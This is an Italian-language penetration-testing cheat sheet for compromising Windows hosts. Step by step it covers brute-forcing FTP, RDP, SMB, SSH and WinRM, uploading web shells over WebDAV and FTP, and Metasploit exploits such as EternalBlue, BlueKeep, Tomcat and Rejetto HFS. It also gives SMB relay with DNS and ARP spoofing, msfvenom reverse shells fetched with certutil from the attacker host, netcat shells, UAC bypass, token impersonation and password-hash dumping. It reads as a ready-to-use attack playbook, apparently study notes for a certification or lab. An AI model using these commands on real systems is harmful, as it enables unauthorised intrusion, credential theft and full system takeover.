...
<table><thead><tr><th width="83">Port</th><th>Service</th><th>Funzione</th></tr></thead><tbody><tr><td>80</td><td>Microsoft IIS</td><td>Web server di Microsoft</td></tr><tr><td>80</td><td>WebDAV</td><td>Estensione di HTTP che permette a più users di modificare e gestire files su un web server remoto.</td></tr><tr><td>139</td><td>NetBIOS (SMB)</td><td>Condivisione di file.</td></tr><tr><td>443</td><td>Microsoft IIS</td><td>Web server di Microsoft.</td></tr><tr><td>443</td><td>WebDAV</td><td>Estensione di HTTP che permette a più users di modificare e gestire files su un web server remoto.</td></tr><tr><td>443</td><td>WinRM</td><td>Usato per fare accesso da remoto.</td></tr><tr><td>445</td><td>SMB/CIFS</td><td>Condivisione di file.</td></tr><tr><td>3389</td><td>RDP  </td><td>GUI per face accesso da remoto. (no installato di default)</td></tr><tr><td>5985</td><td>WinRM</td><td>Usato per fare accesso da remoto.</td></tr><tr><td>5986</td><td>WinRM (HTTPS)</td><td>Usato per fare accesso da remoto.</td></tr></tbody></table>
...
#OPPURE
hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ftp
```
...
Se vuoi prendi i file come segue
...
{% tab title="ftp_login - msf (GOOD)" %}
rova user@psw con brute-force
...
ftp <IP>                        #Fai login con creds
    get <FILE>.txt              #Se trovi file utili, prendili dalla vittima
    exit
    ls
```
...
### <mark style="color:$primary;">HTTP exp - IIS WebDAV / DAV, asp (GIT)</mark>

{% hint style="warning" %}
\[HIGH PRIVILEGE] - Usato per condivisione di file su web server                                               PORT 80/443

REC - Accesso con credenziali e poi carica revshell (Si windows e 99% si Linux)
{% endhint %}

Controlla che ci sia webdav su http

```shellscript
nmap -sV -p 80 --script=http-enum <IP>                            #Potentially interesting folder (401 Unauthorized)
gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,html

ls -al /usr/share/webshells/php/
curl http://<IP>/<FOLDER>/ --upload-file /usr/share/webshells/php/simple-backdoor.php #e.g. FOLDER=/uploads/
```

Brute force per trovare le credenziali

{% tabs %}
{% tab title="hydra - Non so ne user ne psw" %}
```shellscript
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <IP> http-get /<CARTELLA_CON_LA_AUTH_WEBDAV>/             #la cartella portebbe essere /webdav/
```
{% endtab %}

{% tab title="hydra - So già user" %}
```shellscript
hydra -l <USER> -P /usr/share/wordlists/metasploit/common_passwords.txt <IP> http-get /<CARTELLA_CON_LA_AUTH_WEBDAV>/         #la cartella portebbe essere /webdav/
```
{% endtab %}
{% endtabs %}

Login al path sotto (su browser) usando user@psw

```edge
http://<IP>/<CARTELLA_CON_LA_AUTH_WEBDAV>/                #la cartella potrebbe essere /webdav/
```

Testa quale formato di file può essere caricato ed essere eseguito su server webdav.

```shellscript
davtest -auth <USER>:<PSW> -url http://<IP>/<CARTELLA_CON_LA_AUTH_WEBDAV>                #folder probabile: /webdav o /dav
#Controlla:
    #Sending test files
    #Checking for file execution
```

Fai upload della revshell su webdav nel formato che hai trovato essere accettato.

{% tabs %}
{% tab title="Revshell - cadaver (BEST) " %}
Usa cadaver per caricare una revshell pre-esistente&#x20;

```shellscript
cadaver http://<IP>/<CARTELLA_CON_LA_AUTH_WEBDAV>
    #Carica shell del formato accettato ed eseguibito
    put /usr/share/webshells/<formato_accettato_ed_eseguibile>/webshell.<formato_accettato_ed_eseguibile>
    
    #WARNING
    #PHP: Modifica la shell  [ip:KALI, port:1234] e da Kali lancia [nc -nvlp 1234] 
```

Ora torna sul web e su http://\<IP>/webdav fai doppio click sulla shell caricata.

OPPURE&#x20;

{% code title="HTTP" %}
```http
http://<IP>/webshell.<formato_scelto>
```
{% endcode %}
...
{% tab title="Revshell ASP - msf (GOOD x ASP)" %}
```shellscript
use exploit/windows/iis/iis_webdav_upload_asp
    set LHOST <IP_ATTACKER>
    set LPORT <IP_ATTACKER>
    set HttpUsername <USER>
    set HttpPassword <PSW>
    set RHOST <IP>
    set PATH /<CARTELLA_CON_LA_AUTH_WEBDAV>/metasploitshell.asp
    exploit
    #se WebDAV è su 443 cambia RPORT 443 e SSL true
```

Usa la shell da msf
{% endtab %}

{% tab title="Revshell - msf" %}
Crea una revshell con metasploit

```shellscript
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT_ATTACKER> -f <formato_accettato_ed_eseguibile> > revshell.<formato_accettato_ed_eseguibile>
```

Ora caricala usando cadaver.

```shellscript
cadaver http://<IP>/<CARTELLA_CON_LA_AUTH_WEBDAV>
    #Fornisci le credenziali di prima
    #Carica la shell che hai creato prima con metasploit
    put root/<NOME_SHELL_CREATA>
```

Procedi per usare la shell caricata

```shellscript
use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <IP_ATTACKER_SCELTO_PRIMA_PER_LA_SHELL>
    set LPORT <PORT_ATTACKER_SCELTA_PRIMA_PER_LA_SHELL>
    run
#Ora clicca sulla revshell sul browser e potrai usare la shell da msf
```
{% endtab %}
{% endtabs %}

_**RICORDA:**_ se hai creato una shell da msfvenom probabilmente ti servirà di aprire un listener prima di lanciare la shell da browser. Dunque:

```shell
nc -nvlp <PORT>
#Poi lancia la shell dal browser
#Dovresti avere la shell su terminale
```

***

### <mark style="color:$primary;">HTTP + FTP exp - IIS + Asp + accesso a FTP (apri shell caricando su FTP)</mark>

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=1234 -f aspx > winshell.aspx
```
...
```html
http://<IP>/<PATH>/winshell.aspx                #PATH forse nulla o forse e.g. IPC$
```
...
### <mark style="color:$primary;">HTTP exp - Writable folder</mark>

```shell
smbclient //<IP>/<WRITABLE_FOLDER> -N -c "put /usr/share/webshells/asp/webshell.asp webshell.asp"
```

***

### <mark style="color:$primary;">HTTP exp - ApacheTomcat</mark>

{% hint style="warning" %}
Apache Tomcat v8.5.19 è vulnerabile a RCE. (solo Windows)   &#x20;
{% endhint %}

Apache Tomcat è un web server che hosta websites dinamici o webApp sviluppate in JAVA.

{% code title="Setup msfconsole" %}
```shell
workspace -a tomcat
workspace
```
...
Se hai individuato Tomcat v8.5.19 sulla victim

{% code title="msf" %}
```shell
use exploit/multi/http/tomcat_jsp_upload_bypass
    set payload java/jsp_shell_bind_tcp
    set SHELL cmd                                                        #setta così se la vittima usa windows
    run
#Potrebbe non funzionare, se non funziona stoppa e ri-run
```
{% endcode %}

Quando funziona sei dentro

{% code title="shell_1" %}
```shell
dir 
getuid                                                                   #Darà getuid quindi carica meterpreter sotto
whoami                                                                   #se vuoi uscire CTRL+Z y. Ma non farlo ora.
```
{% endcode %}

Apri nuovo terminale on me

{% code title="msf (handler)" %}
```shellscript
msfconsole -q
use multi/handler                                                        #Listener
    set payload windows/meterpreter/reverse_tcp
    set LHOST <IP_ATTACKER>
    set LPORT <PORT_DI_PRIMA_MSFVENOM>
    run
```
{% endcode %}

Per avere una sessione meterpreter&#x20;

{% code title="nuovo terminale on me" %}
```shell
pwd                                                                      #/root
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<SCEGLI_PORT> -f exe > meterpreter.exe
sudo python -m SimpleHTTPServer 80
```
{% endcode %}

Torna alla shell di prima (se ti si era chiusa: "session" e poi "session \<NUMBER>")

{% code title="shell_1" %}
```shell
certutil -urlcache -f http://<IP_ATTACKER>/meterpreter.exe meterpreter.exe
dir                                                                     #Check che è presente l'exe
.\meterpreter.exe
```
{% endcode %}

Su msf (handler ora avrai una revShell)

{% code title="meterpreter (on shell_1)" %}
```shell
sysinfo
getuid
```
...
### <mark style="color:$primary;">HTTP exp - httpFileServer</mark>

Web server studiato per condividere file e documenti.

{% hint style="warning" %}
Rejetto httpFileServer v2.3 (HFS v2.3) è vulnerabile a RCE.                                                                PORT 80
{% endhint %}
...
Check che ci sia "HTTPFileServer httpd v2.3" nel port scanning

```shell
use exploit/windows/http/rejetto_hfs_exec
    setg RHOSTS <IP>
    setg RPORT <PORT>                                                #80
    #Forse dovrai settare il payload                                 
    set payload windows/x64/meterpreter/reverse_tcp                  #x64 in base al TARGET
    run
```

***

### <mark style="color:$primary;">HTTP exp - http v<2.7</mark>
...
use exploit/windows/http/badblue_passthru
    setg RHOSTS <IP>
    set target <TARGET>                                   #potrebbe essere <Badblue\ EE\ 2.7\ Universal>
    run
...
{% hint style="info" %}
Forse collegato ad una webpage.
{% endhint %}
...
#Potrebbe essere che non ci sta psw. In tal caso scrivi solo -p senza mettere PSW
```
{% endtab %}
...
### <mark style="color:$primary;">RDP exp - bruteForce</mark>

{% hint style="info" %}
\[USER TROVATO PRIVILEGE] - Usato per remote access                                            PORT 3389 o altre TCP

REC - Accesso con credenziali e usa il servizio RDP
{% endhint %}

Se non lo sai già guarda se c'è RDP sul target.
...
{% tab title="hydra - Non so ne user ne psw" %}
```shellscript
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s <PORT_USATA_PER_RDP>
```
{% endtab %}
{% endtabs %}
...
```shellscript
xfreerdp /u:<USERNAME> /p:<PSW> /v:<IP_TARGET>:<PORT_USATA>
```

***

### <mark style="color:$primary;">RDP exp - RDP e OSv</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGE] - Usato per remote access                                                           PORT 3389 o altre TCP
...
Check che sia vulnerabile a EternalBlue
...
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set RHOSTS <IP>
    show targets
    set target <NUMERO_DEL_OS_DELLA_VITTIMA>
    run
```

Se funziona prova "sysinfo", "getuid".

***

### <mark style="color:$primary;">SMB exp - bruteForce</mark>
...
* Share auth (psw x accesso a restricted share)
...
#OPPURE
hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 smb
```
{% endtab %}

{% tab title="smb_login - msf (BEST)" %}
```shellscript
#Se con "nmap -p445 --script smb-enum-users.nse <IP>" hai trovato qualche user particolare prova a creare un file con quei nomi o aggiungili al file che usi per hydra
use auxiliary/scanner/smb/smb_login                                #oppure usa hydra
    setg RHOSTS <IP>
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    #OPPURE SE SAI USER
    set SMBUser <USER>
    ...
    run
creds
#La psw se ci sta è su "private"
```
{% endtab %}
{% endtabs %}

Fai il login ad SMB e ottieni una shell

{% tabs %}
{% tab title="Login - smbclient (BEST)" %}
Mostra tutte le sharenames

```shell
smbclient \\\\<IP>\\<USER> -U <USER> 
```

Vedrai le sharename disponibili.

Login alla sharename che vuoi:&#x20;

```shell
smbclient \\\\<IP>\\<SHARENAME_SCELTA> -U <USER>              #Fornisci user@psw
    ls 
    type <FILE>.txt
```
{% endtab %}

{% tab title="Login e Shell - msf (BEST)" %}
```shellscript
msfconsole -q
use exploit/windows/smb/psexec
    ...
    set SMBUser <USER>
    set SMBPass <PSW>
    #FORSE set payload windows/x64/meterpreter/reverse_tcp
    exploit
```

Meterpreter SHELL dovrebbe partire.&#x20;

Per fare comandi come whoami lancia una shell da meterpreter
...
{% tab title="Login - psexec.py" %}
```shellscript
psexec.py <ADMIN_USER>@<IP> cmd.exe
#dai la psw e avrai la revshell
```
...
### <mark style="color:$primary;">SMB exp - SMB v1</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGE] - Usato per condivisione di file                                                                   PORT 139/445
...
```shellscript
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 <IP>                            #VULNERABLE: ...
```

{% tabs %}
{% tab title="Auto Exploit - msf (BEST)" %}
```shellscript
...
{% tab title="Manually Exploit - AutoBlue (NO)" %}
```shellscript
cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh                                    #Metti y
    <IP_ATTACKER>
    <porta_che_vuoi_usare>                         
    <porta_che_vuoi_usare>                         #2 volte la stessa
    1
    1
```

Apri una connessione netcat

{% code title="Attacker" %}
```shellscript
nc -nvlp <porta_che_volevi_usare_prima>
```
{% endcode %}
...
{% code title="Attacker" %}
```shellscript
cd <PATH_TO_ETERNALBLUE_EXPLOIT.PY>
chmod +x eternalblue_exploit<windows_version>.py
python eternalblue_exploit<windows_version>.py <IP> shellcode/sc_<x64/x86_IN_BASE_AL_OS_DELLA_VITTIMA>.bin
```
{% endcode %}

Usa la connessione netcat creata prima nell'altra bash.
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">SMB exp - smb relay MITM</mark>
...
{% hint style="info" %}
Relay Attack: intercetta traffico SMB, manipolalo e invialo al server legittimo per guadagnare unauth access.
{% endhint %}

```shell
#Con il fake file dns point tutte le richieste per l' azienda.com alla tua macchina kali
echo "<IP_ATTACKER> *.<AZIENDA.COM>" > dns 
dnsspoof -i eth1 -f dns                                    #Usalo per ridirezionare tutte le richieste a te
#Lascia così in ascolto
```
...
arpspoof -i eth1 -t <IP_CLIENT_SMB> <IP_GATEWAY>
#Lascia così in ascolto
```
...
```shell
arspoof -i eth1 -t <IP_GATEWAY> <IP_CLIENT_SMB>
#Lascia così in ascolto
```
...
use exploit/windows/smb/smb_relay
    ...
    set LHOST <IP_ATTACKER>                              #Sono uguali non è un errore
    set SMBHOST <IP>                                     #IP vittima
    run 
    
jobs                                                     #Check se c'è un job relativo a smb_relay exploit
```

Torna al terminale con dnsspoof e guarda se appare (aspetta secs o mins)

Quando appare torna su exploit/windows/smb/smb\_relay e dovresti vedere che si è aperta una sessione. Per controllare:

```shell
sessions
#Dovrebbe esserci una sessione simile a: 
#meterpreter x86/windows NT AUTHORITY/SYSTEM @ FILESERVER 
sessions <NUMBER>
```
...
getuid
sysinfo
#Ora ruba gli NTLM Hashes
```
{% endcode %}

***

### <mark style="color:$primary;">SNMP exp - bruteForce</mark>

{% hint style="warning" %}
VULNERABLE: SNMPv1 & SNMP v2c
{% endhint %}

Brute force COMM\_STRING (psw)

Trova le comm\_string (e.g. public, private, secret).

```shell
nmap -sU -p 161 --script=snmp-brute <IP>
```

Leggi le varie info e soprattutto gli users (snmp-win32-users)
...
{% hint style="info" %}
Tramite SNMB capisci users.

Una volta capiti attacca altro servizio
{% endhint %}

E.G. Attacca SMB o altri servizi

```shellscript
hydra -L /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> smb   #SMB non è errato
```
...
#OPPURE
hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ssh
```
...
### <mark style="color:$primary;">WinRM exp - bruteForce</mark>

{% hint style="info" %}
\[USER TROVATO PRIVILEGE] - Usato per remote access                                    PORT 5985 e 5986 (HTTPS)

REC -&#x20;
{% endhint %}

Fai bruteforce per trovare credenziali di un user specifico winrm
...
use auxiliary/scanner/winrm/winrm_cmd
    set USERNAME <USER>
    set PASSWORD <PSW>
    set CMD <CMD_DA_ESEGUIRE>                        #e.g. whoami
    run
```
{% endtab %}

{% tab title="Users list (BEST)" %}
```shellscript
crackmapexec <PROTOCOLLO_TARGET> <IP> -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt                        #PROTOCOLLO_TARGET: winrm
```

Se hai trovato delle credenziali

```shellscript
crackmapexec <PROTOCOLLO_TARGET> <IP> -u <USER> -p <PSW_TROVATA> -x "<CMD_DA_ESEGUIRE>"                        #PROTOCOLLO_TARGET: winrm, SM_DA_ESEGUIRE (whoami, systeminfo)
```
{% endtab %}

{% tab title="Single user" %}
```shellscript
crackmapexec <PROTOCOLLO_TARGET> <IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt                        #PROTOCOLLO_TARGET: winrm
```
{% endtab %}
{% endtabs %}
...
{% tabs %}
{% tab title="msf (BEST)" %}
Se funziona winrm\_cmd allora crea sessione meterpreter con script\_exec

```shellscript
#al primo tentativo potrebbe fallire, riprova
...
Fornisce auto una command shell nel target

```shellscript
evil-winrm.rb -u <USER> -p '<PSW>' -i <IP_TARGET>
```

Se funziona prova "whoami", "ipconfig", "net user"
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">Wordpress</mark>
...
```shell
curl "http://<IP>/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../flag3.txt"
```
...
1. <mark style="color:orange;">Info sul sistema</mark> (hostname, OS, OS architecture (x64/x86), updates/hotfixes installati).                    Da meterpreter:
   1. getuid, sysinfo
   2. shell
      1. hostname
      2. systeminfo
2. <mark style="color:orange;">Users e groups</mark> (current user & privileges, altre info sull'user, altri users nel sistema, groups, membri del administration group).                                                                                                                                     Da meterpreter:
   1. getuid, getprivs
   2. shell
      1. whoami
      2. whoami /priv
      ...
      5. net localgroup remote desktop users
3. <mark style="color:orange;">Network Info</mark> (victim IP e network adapter, internal networks, servizi TCP/UDP, altri hosts nel network, routing tables, stato del firewall).                                                                                                        Da meterpreter:
   1. shell
      1. ipconfig
      2. ipconfig /all
      3. route print
      4. netstat -ano
      5. netsh advfirewall dump
      6. netsh advfirewall show allprofiles
4. <mark style="color:orange;">Processi, servizi e scheduled tasks</mark> (process (instanza di un exe visibile su Desktop), servizi (processo non visibile su Desktop in background) e scheduled tasks).                                                                           Da meterpreter:
   1. ps
   2. pgrep \<SERVICE>.exe                                                   prova a usare explorer
   3. migrate \<SERVICE\_PID>
   4. shell
...
5. <mark style="color:orange;">Automating Windows Local Enum</mark>                                                                                                                       Da meterpreter:
   1. use post/windows/gather/win\_privs
   2. use post/windows/gather/enum\_logged\_on\_users
   3. use post/windows/gather/enum\_applications
   4. use post/windows/gather/enum\_computers
   5. use post/windows/gather/enum\_shares

***

### <mark style="color:$primary;">Enum</mark>

{% code title="msf (POST-EXPLOIT)" %}
```shell
use exploit/windows/winrm/winrm_script_exec
...
### <mark style="color:$primary;">JAWS</mark>

Kali attacker

<details>

<summary>Copia il codice sotto in un file su attacker in <code>root/Desktop/jaws-enum.ps1</code></summary>
...
shell
    dir                                    #Check che ci sia il jaws-enum.ps1
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    #Aspetta 2/3 minuti
    dir                                    #Check che ci sia il jaws-enum.txt
    CTRL-C y
download JAWS-Enum.txt
#Cerca JAWS-Enum.txt su kali in root/  
```
{% endcode %}
...
### <mark style="color:$primary;">SMB - postExp enum</mark>

Puoi enumerare tutti gli user

{% tabs %}
{% tab title="User enum - enum4linux" %}
```shell
enum4linux -u <USERNAME> -p <PSW> -U <IP>
```
{% endtab %}

{% tab title="User enum - msf" %}
```shell
...
### <mark style="color:$primary;">MySQL - postExp enum</mark>

Se puoi modifica file di config come ad esempio&#x20;

{% code title="phpmyadmin.conf" %}
```shell
#Se hai accesso negato ad una page modifica il file di config in modo da poter accedere
vim phpmyadmin.conf
    #e.g.
    Allow from all
    #:wq
#Per farlo funzionare riavvia da una meterpreter shell il servizio
net stop wampapache
#Se ora vai sul web puoi accedere
```
{% endcode %}
...
1. Setta un web server con Python o usa netcat
2. Trasferisci file su Windows/Linux

### <mark style="color:$primary;">Kali -> Victim (W)</mark>

Non serve meterpreter
...
```shellscript
cd /usr/share/windows-binaries                       #/PATH/DEL/FILE.exe
...
certutil -urlcache -f http://<IP_KALI>/nc.exe nc.exe
```
...
```shell
nc -nv <IP_KALI> 1234 < test.txt
```
{% endhint %}
{% endtab %}

{% tab title="kali -> victim (nc)" %}
CHI INVIA - KALI

```shellscript
nc -nvlp 4444 < FILE/TO/SEND.exe
```

CHI PRENDE IL FILE - VICTIM (Windows)

```shellscript
nc.exe <IP_KALI> 4444 > C:\FILE/TO/SEND.exe
```
{% endtab %}
{% endtabs %}
...
Se con l'exploit hai già high privilege non serve farlo: se hai ottenuto una non-interactive shell o uno standard cmd shell hai bisogno di fare l'upgrade ad una meterpreter shell per poter fare altri task che vuoi.&#x20;
...
Shell remota dove la vittima si connette al listener dell'attacker permettendogli di eseguire comandi sulla vittima.
...
dir                                                  #Check che ci sia nc.exe
```

Kali

```shell
nc -nvlp 1234                                             #Setta il listener sull'attacker
```

VICTIM

```shell
./nc.exe -nv <IP_KALI> 1234 -e cmd.exe
```
...
### <mark style="color:$primary;">RevShell usando FTP</mark>

Dopo l'accesso a FTP crea, carica e usa una revShell.

```shell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f asp > <SHELL>.aspx
```

Login

{% code title="kali - terminale1" %}
```shell
ftp <IP> 21
    #Name: <USER_TROVATO>
    #Password: <PSW_TROVATA>
    put <SHELL>.aspx
    dir                                                     #Check se caricata
```
{% endcode %}

Apri altro terminale

{% code title="kali - terminale2" %}
```shell
use multi/handler 
...
Vai sul browser e dovresti avere la shell

{% code title="http website" %}
```http
http://<IP>/<SHELL>.aspx
```
{% endcode %}
...
### <mark style="color:$primary;">SSH -> Meterpreter</mark>

{% code title="KALI" %}
```shell
#Per creare una revshell per windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe -o shell.exe
#OPPURE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe -o shell.exe
...
#Altro terminale ma sempre su KALI    
python3 -m http.server 8000
```
{% endcode %}

{% code title="VICTIM - no meterpreter" %}
```shell
#Metti le cose all'interno della folder /root (~)
certutil -urlcache -f http://<IP_KALI>:8000/shell.exe shell.exe
shell.exe
```
{% endcode %}
...
Se con l'exploit non hai ricevuto gli high privileges elevali

1. Trova vuln per PrivEsc
2. Fai privEsc su Windows/linux

### PowerUp

<details>

<summary>Copia il codice sotto in un file su attacker <code>/root/Desktop/PowerUp.ps1</code></summary>
...
{% code title="meterpreter - VICTIM" %}
```shellscript
#Dopo aver fatto exploit e avendo meterpreter
cd C:\\
dir
#Se non esiste crea Temp
mkdir Temp
cd Temp
upload /root/Desktop/PowerUp.ps1
shell
    dir                                    #Check che ci sia il jaws-enum.ps1
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    #Aspetta 2/3 minuti
...
### <mark style="color:$primary;">PrivescCheck</mark>

Kali attacker

<details>

<summary>Copia il codice sotto in un file su attacker <code>/root/Desktop/PrivescCheck.ps1</code></summary>
...
$Crumbliest = ""
$Centurions = ""
$Culbertson = ""
$Christoper = ""
$Monarchies = ""
$Flippantly = ""
$Cryptogram = ""
$Ceremonies = ""
$Cunningham = ""
$Chrysostom = ""
$Moneymaker = ""
$Forcefully = ""
$Floorboard = ""
$Cudgelling = ""
$Chagrining = ""
$Darjeeling = ""
$Cincinnati = ""
$Monomaniac = ""
$Foreclosed = ""
$Vernacular = ""
$Flatfishes = ""
$Discreeter = ""
$Goalkeeper = ""
$Capistrano = ""

$Modules = @($Flickering,$Crumbliest,$Centurions,$Culbertson,$Christoper,$Monarchies,$Flippantly,$Cryptogram,$Ceremonies,$Cunningham,$Chrysostom,$Moneymaker,$Forcefully,$Floorboard,$Cudgelling,$Chagrining,$Darjeeling,$Cincinnati,$Monomaniac,$Foreclosed,$Vernacular,$Flatfishes,$Discreeter,$Goalkeeper,$Capistrano)
...
@("Flickering","Crumbliest","Centurions","Culbertson","Christoper","Monarchies","Flippantly","Cryptogram","Ceremonies","Cunningham","Chrysostom","Moneymaker","Forcefully","Floorboard","Cudgelling","Chagrining","Darjeeling","Cincinnati","Monomaniac","Foreclosed","Vernacular","Flatfishes","Discreeter","Goalkeeper","Capistrano") | ForEach-Object { Remove-Variable -Name $_ }

```

</details>

{% code title="meterpreter|powershell - VICTIM" %}
```shellscript
#Dopo aver fatto exploit e avendo meterpreter
cd C:\\
dir
cd Users
cd <USER_TROVATO>     #OPPURE         whoami
cd Desktop
mkdir PrivescCheck
cd PrivescCheck
upload /root/Desktop/PrivescCheck.ps1
dir                                        #Check che ci sia il jaws-enum.ps1
shell
    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    #Oltre alle tante info ti dice le vuln per privesc
    #Alla fine dell'output REPORT RIASSUNTIVO
```
{% endcode %}

***

### <mark style="color:$primary;">Usa Cred trovate</mark>

Una volta trovato user e psw (in chiaro o hashed) fai login a victim con uno di questi servizi:
...
{% code title="msf" %}
```shellscript
#Fai login alla vittima usando l'exploit di msf
use exploit/windows/smb/psexec            
    set RHOSTS
    set RPORT
    set SMBUser
...
#Dovresti avere una shell, fai check che hai fatto accesso
whoami
whoami /priv
```
{% endcode %}
...
{% tab title="WinRM" %}
Se WinRM in running e porta aperta (5985 o 5986)
...
{% tab title="RDP" %}
Se RDP in running e porta aperta (3389)
...
{% tab title="SMB - psexec.py" %}
{% code title="kali" %}
```shellscript
#Fai login alla vittima usando psexec.py usando il servizio SMB
psexec.py <USER>@<IP>                                                     #Fornisci la psw
...
### <mark style="color:$primary;">Localgroup admin</mark>

Bypassing UAC

{% hint style="warning" %}
Per bypass hai bisogno di: (solo Windows)

* Accesso a user account che fa parte del "admin localgroup"&#x20;
{% endhint %}

{% hint style="info" %}
UAC (User Account Control) feature usata per prevenire cambi non autorizzati del OS.
{% endhint %}

{% tabs %}
{% tab title="MODO 1 (BEST)" %}
Dopo aver fatto l'exploit

{% code title="meterpreter" %}
```shellscript
sysinfo
getuid                                       #Anche se sei VICTIM\admin fai check se sei administrator
ps
ps -S explorer.exe                           #Scegli un processo, consigliato explorer.exe
migrate <PROCESSO_SCELTO>                    #Prova a migrarci (se non hai permessi potresti non riuscire)

getsystem                                    
#Probabilmente non avrai i permessi

getprivs                                     #Check che privilegi hai
shell 
    net users                                #Leggi gli users (a volte "net user")
    net localgroup administrators            #RICORDA LA S in administratorS
    #Leggi sotto "Members" quali user hanno i privilegi da administratore 
    
    #Controlla che il tuo user sta nel gruppo degli admin
    #<NOME_PC>\<USER_CHE_SEI>
    exit
background
```
{% endcode %}

Cerca l'exploit per UACMe per bypassare il check dell UAC

```shell
use exploit/windows/local/bypassuac_injection
    set payload windows/x64/meterpreter/reverse_tcp
    set SESSION <NUMBER>                          #Number sessione appena chiusa (forse meterpreter x64/windows) 
    set LPORT <PORT>                              #e.g. 4433
    run
#Se da errore: "bad-config: x86 Target Selected for x64 System"
    set TARGET Windows\ x64
    run
```

Sei dentro con privilegi

{% code title="meterpreter" %}
```shell
sysinfo
getuid                                             #No privilegi :(
getsystem # MUST!!                                 #MUST!! Fallo per elevare i privilegi 
getuid                                             #Ora NT AUTHORITY\SYSTEM
hashdump                                           #Leggi tutti gli hash delle psw (user:RID:LMhash:NTLMhash::)
...
<mark style="color:yellow;">Crea payload per UACme</mark>
...
<mark style="color:yellow;">Torna sulla vittima e apri la connessione con attacker</mark>

{% code title="meterpreter" %}
```shellscript
cd C:\\Users\\<ADMIN>\\AppData\\Local\\Temp        
#OPPURE SE NON ESISTE TEMP
mkdir Temp
cd Temp
#Dopo che sei in Temp
...
<mark style="color:yellow;">Torna su meterpreter e lancia la shell</mark>

{% code title="meterpreter" %}
```shellscript
shell
    Akagi64.exe 23 C:\Users\<ADMIN>\AppData\Local\Temp\backdoor.exe     #Dovresti vedere backdoor.exe
```
{% endcode %}

<mark style="color:yellow;">Torna su attacker (su multi/handler) e dovrebbe essere partita una shell</mark>

{% code title="meterpreter" %}
```shellscript
ps                                                 #Trova un processo con NT AUTHORITY/SYSTEM
ps -S lsass.exe                                    #Se c'è lsass.exe ed è un NT AUTHORITY/SYSTEM va bene
migrate <PROCESSO_CON_AUTHORITY_SYSTEM>

getsystem
getuid                                             #Ora dovresti avere NT AUTHORITY/SYSTEM                                                        
getprivs                                           #Ora dovresti avere molti privilegi AUTHORITY/ADMIM
...
### <mark style="color:$primary;">SeImpersonate, seAssign</mark>

Usa Access Token - solo WINDOWS

{% hint style="info" %}
Access Token sono responsabili d'identificare e descrivere i security context di un processo in running su OS e contengono identità e privilegi di un user.

Generati dal processo winlogon.exe ogni volta che un user fa l'accesso.&#x20;
{% endhint %}

{% hint style="warning" %}
Per impersonare hai bisogno di almeno uno di questi privs: (solo Windows)

* **SeAssignPrimaryToken:** permette ad un user di impersonare tokens.
* **SeCreateToken:** permette ad un user di creare un token arbitrario con privilegi da amministratore
* **SeImpersonatePrivilege:** permette ad un user di creare un processo sotto il security context di un altro user di solito con privilegi da amministratore.
{% endhint %}

```shell
sessions <NUMBER>                                     #Se non aperta apri la sessione
```

{% code title="meterpreter - windows OS " %}
```shellscript
sysinfo
...
#cerca se hai uno dei privilegi elencati sopra.
#qui SetImpersonatePrivilege
load incognito
list_tokens -u                                         #leggi tutti i token e prendi quello di Administrator

#leggi il token più alto in "Delegation Tokens Available"
impersonate_token "<NOME_TOKEN\Administrator>"      
#SE LEGGI TOKEN O NON HA FUNZIONATO IL CMD PRIMA PROVA IL CMD METERPRETER 
#getsystem   

getuid                                                 #controlla che ora hai <NOME_TOKEN\Administrator>
getprivs                                               #potrebbe dare Access is denied ma continua
ps
migrate <PID_processo_con_high_priv>                   #forse explorer.exe
getprivs                                               #dovrebbero esserci molti più privilegi
hashdump                                               #Leggi tutti gli hash delle psw (user:RID:LMhash:NTLMhash::)
#Se non funziona usa modulo msf (leggi paragrafo Linux Cred Dumping)
cd C:\\                                                #Se vuoi cerca nella dir dell'Administrator
cd Users
cd <Administrator>
dir 
```
...
### <mark style="color:$primary;">SeImpersonatePrivilege, SeAssignPrimaryTokenPrivil</mark>

Se hai uno di questi due privilegi potresti diventare SYSTEM usando printspoofer
...
{% code title="VICTIM (e.g. SSH) - no meterpreter" %}
```shell
#Metti le cose all'interno della folder /root (~)
certutil -urlcache -f http://<IP_KALI>:8000/PrintSpoofer64.exe spoofer.exe
spoofer.exe -i -c cmd.exe
```
{% endcode %}
